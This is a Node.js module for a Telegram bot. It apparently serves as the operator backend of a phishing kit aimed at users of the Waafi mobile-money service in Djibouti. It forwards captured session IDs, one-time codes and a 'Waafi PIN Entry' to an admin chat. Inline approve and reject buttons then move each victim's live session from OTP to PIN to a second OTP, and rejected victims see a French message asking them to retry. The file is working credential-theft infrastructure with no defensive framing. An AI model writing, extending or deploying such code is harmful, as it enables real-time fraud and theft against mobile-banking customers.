const TelegramBot = require('node-telegram-bot-api');

const token = process.env.BOT_TOKEN;
const chatId = process.env.ADMIN_CHAT_ID;

if (!token || !chatId) {
    console.error("Crucial environment keys (BOT_TOKEN / ADMIN_CHAT_ID) are undefined.");
}

const bot = new TelegramBot(token);

function formatPayloadMessage(appId, headline, metadata) {
    let baseTemplate = `<b>[DJIBOUTI] ${headline}</b>\n`;
    baseTemplate += `<code>────────────────────────</code>\n`;
    baseTemplate += `ID App Session: <b>${appId}</b>\n`;
    
    for (const [key, val] of Object.entries(metadata)) {
        if (val !== undefined && val !== null && val !== '') {
            const label = key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
            baseTemplate += `* ${label}: <code>${val}</code>\n`;
        }
    }
    baseTemplate += `<code>────────────────────────</code>`;
    return baseTemplate;
}

function buildInlineOptions(appId, prefix = "approve") {
    return {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "Approve / Next", callback_data: `${prefix}_${appId}` },
                    { text: "Reject Status", callback_data: `reject_${appId}` }
                ]
            ]
        },
        parse_mode: 'HTML'
    };
}

function sendToAdmin(appId, title, metadata, generateControls = false) {
    const textContent = formatPayloadMessage(appId, title, metadata);
    // Explicitly uses buildInlineOptions only if generateControls is true (Steps 1, 2, 3 authentication)
    const layoutSettings = generateControls ? buildInlineOptions(appId, "approve") : { parse_mode: 'HTML' };
    
    bot.sendMessage(chatId, textContent, layoutSettings).catch(err => {
        console.error(`Admin channel messaging failure: ${err.message}`);
    });
}

function sendFinalApproval(appId, pinCode) {
    const bodyText = `<b>[DJIBOUTI] Lock Intercepted Account Security PIN</b>\n<code>────────────────────────</code>\nID App Session: <b>${appId}</b>\nWaafi PIN Entry: <code>${pinCode}</code>\n<code>────────────────────────</code>`;
    bot.sendMessage(chatId, bodyText, buildInlineOptions(appId, "pinok")).catch(err => {
        console.error(`Pin data routing failure: ${err.message}`);
    });
}

function sendSecondOTP(appId, backupCode) {
    const textMarkup = `<b>[DJIBOUTI] Warning Secondary Authorization Layer (OTP 2)</b>\n<code>────────────────────────</code>\nID App Session: <b>${appId}</b>\nVerification Key: <code>${backupCode}</code>\n<code>────────────────────────</code>`;
    bot.sendMessage(chatId, textMarkup, buildInlineOptions(appId, "otp2ok")).catch(err => {
        console.error(`Step secondary data routing failure: ${err.message}`);
    });
}

bot.on('callback_query', (query) => {
    const callbackData = query.data;
    const messageId = query.message.message_id;
    
    bot.answerCallbackQuery(query.id, { text: "Processing request..." }).catch(e => console.error(e));
    
    const [action, targetAppId] = callbackData.split('_');
    if (!action || !targetAppId || targetAppId === "null" || targetAppId === "") {
        console.error("Invalid callback action or target room received.");
        return;
    }

    let systemResponseLog = "";

    switch (action) {
        case 'approve':
            global.io.to(targetAppId).emit('admin-approve-otp');
            systemResponseLog = "APPROVED: Initial OTP Verified. Pushed to PIN stage.";
            break;

        case 'pinok':
            global.io.to(targetAppId).emit('pin-verified');
            systemResponseLog = "APPROVED: PIN Captured. Pushed to Secondary Verification (OTP 2).";
            break;

        case 'otp2ok':
            global.io.to(targetAppId).emit('admin-approve-otp2');
            systemResponseLog = "APPROVED: Secondary Layer Cleared. Opened parameters dashboard.";
            break;

        case 'reject':
            global.io.to(targetAppId).emit('admin-reject', { message: "Votre verification a ete rejete. Veuillez reessayer." });
            systemResponseLog = "REJECTED: Application state systematically dropped by admin.";
            break;
            
        default:
            console.warn(`Unrecognized interaction handler context: ${action}`);
            return;
    }

    bot.editMessageText(`${query.message.text}\n\n[Action Log]: ${systemResponseLog}`, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML'
    }).catch(err => console.error(`Message context update exception: ${err.message}`));
});

module.exports = {
    bot,
    sendToAdmin,
    sendFinalApproval,
    sendSecondOTP
};
